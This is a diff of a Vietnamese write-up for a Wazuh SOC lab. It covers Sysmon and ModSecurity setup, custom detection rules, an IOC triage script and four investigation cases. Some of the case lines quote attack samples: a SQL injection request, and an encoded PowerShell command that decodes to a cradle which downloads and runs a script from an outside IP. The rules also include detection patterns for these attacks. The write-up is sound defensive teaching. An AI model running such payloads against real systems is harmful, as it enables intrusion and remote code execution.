@@ -16,7 +16,7 @@
    - [Ca 2: SSH Brute Force & Xâm nhập qua Active Response (True Positive)](#ca-2-ssh-brute-force--xâm-nhập-qua-active-response-true-positive)
    - [Ca 3: Mã hóa PowerShell & Chiếm quyền Persistence (True Positive)](#ca-3-mã-hóa-powershell--chiếm-quyền-persistence-true-positive)
    - [Ca 4: Điều tra Cảnh báo Giả & Tinh chỉnh Luật (False Positive Tuning)](#ca-4-điều-tra-cảnh-báo-giả--tinh-chỉnh-luật-false-positive-tuning)
-6. [Phương pháp Kiểm thử Độc lập bằng `wazuh-logtest`](#6-phương-pháp-kiểm-thử-độc-lập-bằng-wazuh-logtest)
+6. [Phương pháp Kiểm thử Xác thực (Testing Methodology)](#6-phương-pháp-kiểm-thử-xác-thực-testing-methodology)
 7. [Bí quyết Làm chủ Hệ thống & Giải trình Kỹ thuật](#7-bí-quyết-làm-chủ-hệ-thống--giải-trình-kỹ-thuật)
 
 ---
@@ -30,7 +30,7 @@ Khi bắt tay xây dựng lab giám sát an ninh mạng, rất nhiều dự án 
 
 ### 1.2 Quyết định kiến trúc của tôi
 Tôi định hình lại toàn bộ hệ thống xoay quanh **Bản chất thật của SOC Tier 1**:
-- **Log Generator (Hạ tầng sinh log thật):** Chỉ cần 1 máy Windows chạy Sysmon và 1 máy Linux chạy Nginx/ModSecurity.
+- **Log Generator (Hạ tầng sinh log thật):** 1 máy Windows chạy Sysmon và 1 máy Linux chạy Nginx/ModSecurity.
 - **Log Collector & Processor (Thu thập & Xử lý):** Wazuh Agent đẩy log qua cổng TCP 1514 về Wazuh Manager.
 - **Detection & Correlation (Luật phát hiện & Tương quan):** Viết trong `local_rules.xml` dựa trên MITRE ATT&CK.
 - **Initial Triage & Automation:** Viết script Python tra cứu nhanh IOC qua API của AbuseIPDB và VirusTotal.
@@ -58,25 +58,27 @@ Tôi sử dụng Docker Compose để triển khai cụm Wazuh 4.7.2 chuẩn đ�
 2. `wazuh.indexer`: Nền tảng OpenSearch lưu trữ và đánh chỉ mục (index) log sự kiện.
 3. `wazuh.dashboard`: Giao diện web trực quan hóa hàng đợi cảnh báo (port 443).
 
-**Điểm mấu chốt trong file `deployment/docker-compose.yml`:**
-Tôi thiết lập ánh xạ ổ đĩa trực tiếp (Volume mount) từ file luật tùy chỉnh ngoài máy chủ vào trong container:
+Ánh xạ ổ đĩa trực tiếp từ file luật ngoài máy chủ vào trong container:
 ```yaml
 volumes:
   - ../configurations/siem-rules/local_rules.xml:/var/ossec/etc/rules/local_rules.xml:ro
 ```
-*Lợi ích:* Mỗi lần tôi chỉnh sửa luật phát hiện hoặc thêm luật loại trừ (Tuning), tôi chỉ cần khởi động lại dịch vụ quản lý bằng lệnh `docker exec -it deployment-wazuh.manager-1 /var/ossec/bin/wazuh-control restart` mà không cần build lại Docker image.
+Mỗi lần chỉnh sửa luật phát hiện hoặc thêm luật loại trừ (Tuning), chỉ cần khởi động lại dịch vụ quản lý bằng lệnh:
+```bash
+docker exec -it deployment-wazuh.manager-1 /var/ossec/bin/wazuh-control restart
+```
 
 ---
 
 ### 2.2 Cấu hình Endpoint Windows (Sysmon + Wazuh Agent)
-Một hạn chế lớn của Windows Event Viewer mặc định là log Application/System không ghi nhận chi tiết đối số dòng lệnh hoặc hàm băm tệp. Do đó, tôi triển khai **Sysmon (System Monitor)**:
+Windows Event Viewer mặc định không ghi nhận chi tiết đối số dòng lệnh hoặc hàm băm tệp. Do đó, tôi triển khai Sysmon:
 
 1. **Cài đặt Sysmon:**
-   Sử dụng cấu hình chuẩn bảo mật từ cộng đồng tại [`configurations/windows-agent/sysmonconfig.xml`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/windows-agent/sysmonconfig.xml):
+   Sử dụng cấu hình chuẩn bảo mật từ cộng đồng tại `configurations/windows-agent/sysmonconfig.xml`:
    ```cmd
    sysmon.exe -accepteula -i configurations/windows-agent/sysmonconfig.xml
    ```
-2. **Cấu hình đẩy log trong [`configurations/windows-agent/ossec.conf`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/windows-agent/ossec.conf):**
+2. **Cấu hình đẩy log trong `configurations/windows-agent/ossec.conf`:**
    Kích hoạt đọc kênh sự kiện `Microsoft-Windows-Sysmon/Operational` và `Security`:
    ```xml
    <localfile>
@@ -88,30 +90,24 @@ Một hạn chế lớn của Windows Event Viewer mặc định là log Applica
      <log_format>eventchannel</log_format>
    </localfile>
    ```
-*Ý nghĩa kỹ thuật:* Cung cấp trường dữ liệu `win.eventdata.commandLine` (Sysmon Event ID 1) và `win.eventdata.targetObject` (Sysmon Event ID 13).
 
 ---
 
 ### 2.3 Cấu hình Web Target Linux (Nginx + ModSecurity WAF + Auth Log)
-Trên máy chủ Linux (Ubuntu/Debian), tôi tích hợp tường lửa ứng dụng web ModSecurity kèm bộ quy tắc OWASP Core Rule Set (CRS) để bảo vệ ứng dụng:
+Trên máy chủ Linux (Ubuntu/Debian), tôi tích hợp tường lửa ứng dụng web ModSecurity kèm bộ quy tắc OWASP Core Rule Set (CRS):
 
-1. **Bật chế độ ghi nhận vi phạm WAF:**
-   Cấu hình ModSecurity ghi nhận toàn bộ payload khả nghi vào `/var/log/modsecurity/modsec_audit.log` với chế độ `SecRuleEngine On`.
-2. **Cấu hình thu thập trong [`configurations/linux-web-agent/ossec.conf`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/linux-web-agent/ossec.conf):**
+1. **Cấu hình ModSecurity:**
+   Ghi nhận toàn bộ payload khả nghi vào `/var/log/modsecurity/modsec_audit.log` với chế độ `SecRuleEngine On`.
+2. **Cấu hình thu thập trong `configurations/linux-web-agent/ossec.conf`:**
    ```xml
-   <!-- Thu thập log xác thực SSH để bắt brute force -->
    <localfile>
      <log_format>syslog</log_format>
      <location>/var/log/auth.log</location>
    </localfile>
-
-   <!-- Thu thập log truy cập web để phân tích mã phản hồi HTTP -->
    <localfile>
      <log_format>apache</log_format>
      <location>/var/log/nginx/access.log</location>
    </localfile>
-
-   <!-- Thu thập log chuyên sâu của WAF khi phát hiện tấn công OWASP -->
    <localfile>
      <log_format>apache</log_format>
      <location>/var/log/modsecurity/modsec_audit.log</location>
@@ -122,59 +118,70 @@ Trên máy chủ Linux (Ubuntu/Debian), tôi tích hợp tường lửa ứng d�
 
 ## 3. THIẾT KẾ LOGIC BẮT CẢNH BÁO TRÊN SIEM (`local_rules.xml`)
 
-Tệp [`configurations/siem-rules/local_rules.xml`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/configurations/siem-rules/local_rules.xml) chứa 4 khối luật đại diện cho 4 ca trực:
+Tệp `configurations/siem-rules/local_rules.xml` chứa 4 khối luật đại diện cho 4 ca trực:
 
 ### Khối 1: Bắt tấn công SQL Injection & Đối chiếu trạng thái WAF
-- **Rule 100100 (Level 10):** Kế thừa luật web cơ bản `31100`, sử dụng Regex PCRE2 quét chuỗi URI:
+- **Rule 100100 (Level 10):** Kế thừa dải luật web phân nhánh `31100, 31101, 31103, 31108` (đảm bảo không bị các luật mặc định của tệp `0250-web_rules.xml` phân loại trước làm nuốt mất sự kiện), sử dụng Regex PCRE2 quét chuỗi URI:
   ```xml
-  <url type="pcre2">(?i)(\%27|\'|--|union\s+select|select\s+.*\s+from|or\s+1\=1|waitfor\s+delay)</url>
+  <rule id="100100" level="10">
+    <if_sid>31100, 31101, 31103, 31108</if_sid>
+    <url type="pcre2">(?i)(\%27|\'|--|union\s+select|select\s+.*\s+from|or\s+1\=1|waitfor\s+delay)</url>
+    <description>Web Attack: SQL Injection attempt detected on web application URI</description>
+  </rule>
   ```
-- **Rule 100101 (Level 6 - Đã ngăn chặn):** Nếu Rule 100100 kích hoạt và mã HTTP trả về là `403`, đánh dấu sự kiện là an toàn vì WAF đã chặn thành công.
-- **Rule 100102 (Level 12 - Nghiêm trọng / Cảnh báo đỏ):** Nếu Rule 100100 kích hoạt nhưng mã HTTP trả về là `200`, hệ thống phát báo động khẩn cấp do payload đã vượt qua tầng phòng thủ (WAF Bypass hoặc chưa bật luật).
+- **Rule 100101 (Level 6):** Kế thừa Rule 100100, bắt mã HTTP `403` khi WAF chặn thành công.
+- **Rule 100102 (Level 12):** Kế thừa Rule 100100, bắt mã HTTP `200` báo động đỏ khi payload lọt qua phòng tuyến.
 
 ### Khối 2: Bắt Brute Force SSH & Tương quan Đăng nhập Thành công
-- **Rule 100201 (Level 10):** Bắt hành vi dò quét mật khẩu thất bại qua SSH:
+- **Rule 100201 (Level 10):** Khai báo `<if_matched_sid>5710, 5716</if_matched_sid>` để bao quát cả trường hợp dò mật khẩu vào tài khoản không tồn tại (SID 5710) lẫn tài khoản có thật như root/ubuntu (SID 5716):
   ```xml
   <rule id="100201" level="10" frequency="5" timeframe="60">
-    <if_matched_sid>5710</if_matched_sid>
+    <if_matched_sid>5710, 5716</if_matched_sid>
     <same_source_ip />
+    <description>Brute Force: Multiple SSH authentication failures from single IP</description>
+  </rule>
   ```
-  *Bản chất:* Nếu trong 60 giây có 5 lần phát sinh luật `5710` (SSHD failed password) từ cùng một địa chỉ IP nguồn (`same_source_ip`), nâng mức cảnh báo lên Level 10.
-- **Rule 100202 (Level 13 - Critical):** Luật tương quan chuỗi (Correlation):
-  Nếu xảy ra luật `5715` (SSHD accepted password) ngay sau khi IP đó vừa kích hoạt Rule `100201`, kết luận ngay: **Tài khoản đã bị chiếm quyền thành công (Account Compromised)**.
+- **Rule 100202 (Level 13 - Critical):** Luật tương quan chuỗi: Nếu xảy ra luật `5715` (SSHD accepted password) ngay sau khi IP đó vừa kích hoạt Rule `100201`, cảnh báo tài khoản bị chiếm quyền.
 
-### Khối 3: Bắt Obfuscated PowerShell & Persistence Run Key
-- **Rule 100301 (Level 10):** Kế thừa Sysmon Process Create `61603`, kiểm tra `originalFileName` là `powershell.exe` và `commandLine` chứa tham số che giấu:
+### Khối 3: Bắt Suspicious PowerShell & Persistence Run Key
+- **Rule 100301 (Level 10):** Kế thừa Sysmon Process Create `61603`, kiểm tra `originalFileName` là `powershell.exe` và `commandLine` chứa tham số che giấu hoặc vượt rào chính sách:
   ```xml
-  <field name="win.eventdata.commandLine" type="pcre2">(?i)\s+-(e|en|enc|encoded|encodedcommand)\s+</field>
+  <rule id="100301" level="10">
+    <if_sid>61603</if_sid>
+    <field name="win.eventdata.originalFileName" type="pcre2">(?i)powershell\.exe</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\s+-(e|en|enc|encoded|encodedcommand)\s+|-executionpolicy\s+bypass)</field>
+  </rule>
   ```
-- **Rule 100302 (Level 10):** Kế thừa Sysmon Registry Event `61613`, kiểm tra `targetObject` chứa `CurrentVersion\\Run`.
+- **Rule 100302 (Level 10):** Kế thừa đúng mã SID của Sysmon Event ID 13 (Registry Value Set) là `61615`:
+  ```xml
+  <rule id="100302" level="10">
+    <if_sid>61615</if_sid>
+    <field name="win.eventdata.targetObject" type="pcre2">(?i)CurrentVersion\\Run</field>
+  </rule>
+  ```
 
 ### Khối 4: Luật Tinh chỉnh Loại trừ (Rule Tuning)
-- **Rule 100401 (Level 0 - Triệt tiêu cảnh báo):**
+- **Rule 100401 (Level 0):**
   ```xml
   <rule id="100401" level="0">
     <if_sid>100301</if_sid>
     <field name="win.eventdata.user" type="pcre2">(?i)^DOMAIN\\svc_backup$</field>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\svchost\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)Backup_Routine\.ps1</field>
+    <description>Tuning: Whitelist authorized IT Backup Service account</description>
+  </rule>
   ```
-  *Bản chất:* Giữ nguyên khả năng bắt hacker nhưng triệt tiêu toàn bộ cảnh báo sinh ra bởi tiến trình sao lưu định kỳ hợp lệ của quản trị viên.
 
 ---
 
 ## 4. TỰ ĐỘNG HÓA LÀM GIÀU DỮ LIỆU TRIAGE (`triage_ioc_checker.py`)
 
-Trong quá trình trực ca, khi phát hiện IP hoặc File Hash lạ, Analyst không nên thực hiện copy-paste thủ công lên từng trang web gây mất thời gian. Tôi viết công cụ dòng lệnh [`scripts/triage_ioc_checker.py`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/scripts/triage_ioc_checker.py) bằng thư viện Python chuẩn:
+Công cụ dòng lệnh `scripts/triage_ioc_checker.py` hỗ trợ bước Initial Triage:
+- Viết bằng Python thuần (`urllib.request` và `json`), không cần cài đặt thêm thư viện phụ thuộc.
+- Tự động nhận diện IPv4 hoặc File Hash (MD5/SHA256).
+- Kết nối trực tiếp API của AbuseIPDB và VirusTotal.
+- Có cơ chế kiểm thử ngoại tuyến tự động trả kết quả mẫu khi không có internet hoặc chưa nạp API key.
 
-### Điểm đặc biệt trong kiến trúc script:
-1. **Zero External Dependency:** Dùng `urllib.request` và `json`, chạy được ngay trên bất kỳ máy chủ nào mà không cần cài thêm `pip install requests`.
-2. **Tự động nhận diện (Input Auto-detection):**
-   - Kiểm tra Regex IPv4: `^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$`.
-   - Kiểm tra độ dài và ký tự Hex của Hash: 32 (MD5), 40 (SHA1), 64 (SHA256).
-3. **Cơ chế Dự phòng Mạng Cô lập (Offline Fallback):**
-   Nếu biến môi trường `VT_API_KEY` hoặc `ABUSEIPDB_API_KEY` chưa được gán (hoặc máy lab không có mạng Internet), script tự động trả về phản hồi mô phỏng phân tích để đảm bảo quy trình kiểm thử không bị gián đoạn.
-
-**Cách tôi chạy công cụ:**
 ```bash
 python scripts/triage_ioc_checker.py -i 203.0.113.45
 python scripts/triage_ioc_checker.py -f 44d88612fea8a8f36de82e1278abb02f
@@ -185,83 +192,49 @@ python scripts/triage_ioc_checker.py -f 44d88612fea8a8f36de82e1278abb02f
 ## 5. QUY TRÌNH THỰC THI & ĐIỀU TRA 4 CA TRỰC ĐIỂN HÌNH
 
 ### Ca 1: Tấn công Web OWASP SQLi & Đối chiếu WAF (True Positive)
-1. **Kịch bản mô phỏng:** Dùng `sqlmap` hoặc trình duyệt bắn chuỗi payload:
-   `GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+null%2Cuser%2Cpassword+FROM+users--+-&Submit=Submit`
-2. **Quy trình tôi điều tra:**
-   - Đọc tệp log mẫu [`sample-logs/case1_modsec_sqli.log`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case1_modsec_sqli.log).
-   - Kiểm tra mã trạng thái HTTP trên Nginx: Request mang mã `403` do ModSecurity can thiệp (Rule 942100). Tuy nhiên, request trước đó lúc 14:10:02 trả về mã `200` chứng tỏ kẻ tấn công đã từng thăm dò thành công.
-3. **Kết luận & Báo cáo:** [Case-01-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-01-OWASP-SQLi-and-WAF-Triage.md). Chặn IP `198.51.100.50` tại tường lửa biên và yêu cầu đội AppSec sửa câu lệnh SQL sang Parameterized Query.
-
----
+- **Nguồn dữ liệu:** Bộ kiểm thử chuẩn của `coreruleset/coreruleset` và `splunk/attack_data` (T1190).
+- **Phân tích:** Request mang mã `403` do ModSecurity chặn (Rule 942100). Request trước đó mang mã `200` chứng tỏ kẻ tấn công đã từng thăm dò thành công khi chưa bật luật.
+- **Hồ sơ:** `incident-reports/Case-01-OWASP-SQLi-and-WAF-Triage.md`.
 
 ### Ca 2: SSH Brute Force & Xâm nhập qua Active Response (True Positive)
-1. **Kịch bản mô phỏng:** Thực hiện 6 lần kết nối SSH với mật khẩu sai liên tiếp nhắm vào các tài khoản `admin`, `root`, `oracle`, `devops`, sau đó đăng nhập thành công bằng tài khoản `devops`.
-2. **Quy trình tôi điều tra:**
-   - Soi chiếu tệp [`sample-logs/case2_ssh_bruteforce.log`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case2_ssh_bruteforce.log).
-   - Phát hiện Rule `100201` kích hoạt lúc 14:20:22.
-   - Thấy tiến trình `ossec-execd` thực thi lệnh: `active-response/bin/firewall-drop.sh add - 203.0.113.45 100201`.
-   - **Phát hiện nghiêm trọng:** Tại giây 14:20:25, trước khi kết nối TCP bị ngắt hẳn, hệ điều hành vẫn kịp xác nhận: `Accepted password for devops from 203.0.113.45 port 41258 ssh2` (Session 42).
-3. **Hành động phản ứng tức thời:**
-   - Cưỡng chế ngắt toàn bộ phiên làm việc của user: `sudo pkill -KILL -u devops`.
-   - Khóa tài khoản: `sudo passwd -l devops`.
-   - Lập biên bản: [Case-02-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-02-SSH-BruteForce-ActiveResponse.md).
-
----
+- **Nguồn dữ liệu:** Tệp `OpenSSH_2k.log` trên kho `logpai/loghub` và `splunk/attack_data` (T1110.001).
+- **Phân tích:** Chuỗi thất bại kích hoạt Rule `100201`, gọi lệnh khóa IP của Active Response (`firewall-drop.sh`). Đồng thời ghi nhận đăng nhập thành công ngay trước khi kết nối TCP bị ngắt hẳn (`Accepted password for devops`).
+- **Hành động:** Ngắt phiên SSH ngay lập tức (`pkill -u devops`), khóa tài khoản (`passwd -l devops`).
+- **Hồ sơ:** `incident-reports/Case-02-SSH-BruteForce-ActiveResponse.md`.
 
 ### Ca 3: Mã hóa PowerShell & Chiếm quyền Persistence (True Positive)
-1. **Kịch bản mô phỏng:** Khởi chạy một tập lệnh PowerShell mã hóa Base64 gọi tải beacon từ máy chủ bên ngoài, đồng thời ghi khóa Registry Run Key.
-2. **Quy trình tôi điều tra:**
-   - Trích xuất dữ liệu JSON từ [`sample-logs/case3_sysmon_encoded_powershell.json`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case3_sysmon_encoded_powershell.json).
-   - Soi Sysmon Event ID 1: Bắt được chuỗi Base64:
-     `SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==`
-   - Giải mã Base64 sang văn bản UTF-16LE:
-     `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')`
-   - Soi Sysmon Event ID 13: Bắt được hành vi ghi khóa `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck` trỏ về `C:\Users\Public\update.exe`.
-3. **Hành động phản ứng:** Cách ly máy trạm khỏi mạng, tiêu diệt PID 4892, xóa khóa Registry và lập biên bản: [Case-03-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-03-Windows-Encoded-PowerShell-Persistence.md).
-
----
+- **Nguồn dữ liệu:** Dự án `OTRF/Security-Datasets` (Mordor) và `sbousseaden/EVTX-ATTACK-SAMPLES` (T1059.001 & T1547.001).
+- **Phân tích:** Sysmon Event ID 1 ghi nhận PowerShell chạy chuỗi Base64. Giải mã UTF-16LE phát hiện lệnh `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')`. Sysmon Event ID 13 ghi nhận khóa khởi động tại `HKCU\...\Run\WindowsUpdateCheck`.
+- **Hành động:** Cô lập máy trạm, dừng tiến trình, xóa khóa Registry và tệp độc hại.
+- **Hồ sơ:** `incident-reports/Case-03-Windows-Encoded-PowerShell-Persistence.md`.
 
 ### Ca 4: Điều tra Cảnh báo Giả & Tinh chỉnh Luật (False Positive Tuning)
-1. **Kịch bản mô phỏng:** Tác vụ sao lưu dữ liệu tự động của hệ thống chạy PowerShell với tham số mã hóa thông báo trạng thái.
-2. **Quy trình tôi điều tra:**
-   - Soi log [`sample-logs/case4_sysmon_admin_false_positive.json`](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/sample-logs/case4_sysmon_admin_false_positive.json).
-   - Phát hiện tài khoản thực thi là `DOMAIN\svc_backup`.
-   - Tiến trình cha là Windows Task Scheduler (`C:\Windows\System32\taskeng.exe`).
-   - Giải mã chuỗi Base64: `Write-Host "Backup in progress"`.
-   - Đối chiếu ticket quản trị: Khớp với Ticket thay đổi hệ thống `#CHG-8921`.
-3. **Quyết định Tuning:** Cảnh báo là **False Positive**. Viết Rule ID `100401` với `level="0"` để triệt tiêu vĩnh viễn 48 cảnh báo giả mỗi ngày, loại trừ Alert Fatigue. Hồ sơ chi tiết tại: [Case-04-Report](file:///c:/Users/Admin/Downloads/My-SOC-Lab-main/incident-reports/Case-04-False-Positive-Alert-Tuning.md).
+- **Nguồn dữ liệu:** Bản ghi thực tế từ kênh `Microsoft-Windows-Sysmon/Operational` trên Windows 10.
+- **Phân tích:** Tiến trình `powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -File "C:\Program Files\IT-Management\Backup_Routine.ps1"` được gọi bởi tiến trình cha `C:\Windows\System32\svchost.exe` (`svchost.exe -k netsvcs -p -s Schedule`) dưới danh nghĩa `DOMAIN\svc_backup`. Hoạt động khớp với Change Ticket `#CHG-8921`.
+- **Hành động:** Thiết lập Rule `100401` với `level="0"` loại trừ cảnh báo giả, triệt tiêu Alert Fatigue.
+- **Hồ sơ:** `incident-reports/Case-04-False-Positive-Alert-Tuning.md`.
 
 ---
 
-## 6. PHƯƠNG PHÁP KIỂM THỬ ĐỘC LẬP BẰNG `wazuh-logtest`
+## 6. PHƯƠNG PHÁP KIỂM THỬ XÁC THỰC (TESTING METHODOLOGY)
 
-Tôi không cần duy trì liên tục nhiều máy ảo gây nặng máy. Mọi luật phát hiện đều được tôi kiểm chứng trực tiếp thông qua công cụ phân tích log nội bộ của Wazuh:
-
-### Quy trình tôi kiểm tra:
-1. Mở terminal kết nối vào container:
+Hệ thống áp dụng 2 cơ chế kiểm thử chuyên biệt phù hợp với đặc thù từng định dạng log:
+1. **Kiểm thử log dạng văn bản (Linux auth.log, Nginx access.log):** Sử dụng công cụ `wazuh-logtest` tích hợp trong Wazuh Manager:
    ```bash
    docker exec -it deployment-wazuh.manager-1 /var/ossec/bin/wazuh-logtest
    ```
-2. Dán dòng log từ file `sample-logs/case2_ssh_bruteforce.log`:
-   ```text
-   Oct 29 14:20:01 web-server sshd[28412]: Failed password for invalid user admin from 203.0.113.45 port 41234 ssh2
-   ```
-3. Quan sát kết quả phân tích theo 3 giai đoạn của Wazuh:
-   - **Phase 1: Pre-decoding:** Nhận diện hostname `web-server`, chương trình `sshd`.
-   - **Phase 2: Decoding:** Trích xuất `srcip: 203.0.113.45`, `dstuser: admin`.
-   - **Phase 3: Rule Matching:** Khớp luật gốc `5710` (SSHD failed password). Lặp lại 5 lần sẽ kích hoạt luật `100201` của tôi.
+   Dán dòng log thô để quan sát 3 giai đoạn Pre-decoding, Decoding và Rule Matching.
+2. **Kiểm thử log Windows Sysmon (EventChannel):** Log Sysmon gửi từ Agent qua kênh `windows_eventchannel` có cấu trúc trường phân nhánh (`win.system.eventID`, `win.eventdata.*`). Việc xác minh được thực hiện qua luồng Agent thực tế hoặc kiểm tra đối chiếu qua tệp nhật ký `archives.json` trong container thay vì dán chuỗi JSON phẳng vào `wazuh-logtest`.
 
 ---
 
 ## 7. BÍ QUYẾT LÀM CHỦ HỆ THỐNG & GIẢI TRÌNH KỸ THUẬT
 
-Khi giải thích về dự án, tôi luôn tự tin làm chủ toàn bộ chi tiết nhờ nắm vững các câu trả lời cốt lõi sau:
-
 1. **Tại sao lại dùng PowerShell UTF-16LE thay vì UTF-8 khi giải mã?**
-   - *Bản chất:* Windows PowerShell được xây dựng trên .NET Framework, quy chuẩn chuỗi ký tự bên trong của PowerShell là Unicode UTF-16LE (Little Endian, mỗi ký tự chiếm 2 byte). Nếu dùng decoder UTF-8 thông thường, các ký tự sẽ bị xen kẽ các byte null (`\x00`), dẫn đến việc đọc chuỗi bị lỗi hoặc ngắt quãng.
+   Windows PowerShell được xây dựng trên .NET Framework, quy chuẩn chuỗi ký tự bên trong của PowerShell là Unicode UTF-16LE (Little Endian, 2 byte/ký tự). Nếu dùng decoder UTF-8 thông thường, các ký tự sẽ bị xen kẽ các byte null (`\x00`), dẫn đến việc đọc chuỗi bị lỗi.
 
 2. **Sự khác nhau giữa việc xóa một Rule và việc đặt `level="0"` (Rule Tuning) là gì?**
-   - *Bản chất:* Nếu xóa Rule mẹ (`100301`), toàn bộ hệ thống sẽ bị mù đối với kỹ thuật tấn công đó. Khi tôi đặt `level="0"` cho Rule con (`100401`) kế thừa qua `<if_sid>`, Wazuh chỉ bỏ qua cảnh báo khi thỏa mãn **đồng thời** cả tài khoản hợp lệ (`DOMAIN\svc_backup`) và tệp script hợp lệ (`Backup_Routine.ps1`). Nếu hacker tấn công dùng PowerShell mã hóa dưới quyền user khác, Rule `100301` vẫn nổ chuông cảnh báo bình thường.
+   Nếu xóa Rule mẹ (`100301`), toàn bộ hệ thống sẽ bị mù đối với kỹ thuật tấn công đó. Khi đặt `level="0"` cho Rule con (`100401`) kế thừa qua `<if_sid>`, Wazuh chỉ bỏ qua cảnh báo khi thỏa mãn đồng thời cả tài khoản hợp lệ (`DOMAIN\svc_backup`), tiến trình cha hợp lệ (`svchost.exe`) và tệp script hợp lệ (`Backup_Routine.ps1`). Nếu hacker tấn công dùng PowerShell dưới quyền user khác, Rule `100301` vẫn nổ chuông cảnh báo bình thường.
 
-3. **Luồng dữ liệu đi từ Endpoint tới Dashboard mất bao lâu?**
-   - *Bản chất:* Wazuh Agent gửi log dạng stream qua kết nối TCP/1514 được mã hóa AES. Quá trình giải mã (Decoders) và so khớp luật (Analysisd) diễn ra trong bộ nhớ RAM (in-memory) mất dưới **50 mili-giây**. Khi phát hiện vi phạm, sự cố được gửi đồng thời sang `wazuh.indexer` (OpenSearch) và kích hoạt Active Response ngay lập tức.
+3. **Tại sao Rule 100100 cần khai báo nhiều SID (`31100, 31101, 31103, 31108`)?**
+   Trong bộ luật mặc định của Wazuh (`0250-web_rules.xml`), một dòng log web Nginx/Apache khi đi vào hệ thống sẽ được phân nhánh tự động: mã lỗi 4xx đi vào 31101, mã 200 đi vào 31108, chuỗi SQLi mặc định đi vào 31103. Nếu chỉ để `<if_sid>31100</if_sid>`, các sự kiện đã bị phân nhánh sẽ không bao giờ khớp với luật custom trong `local_rules.xml`.
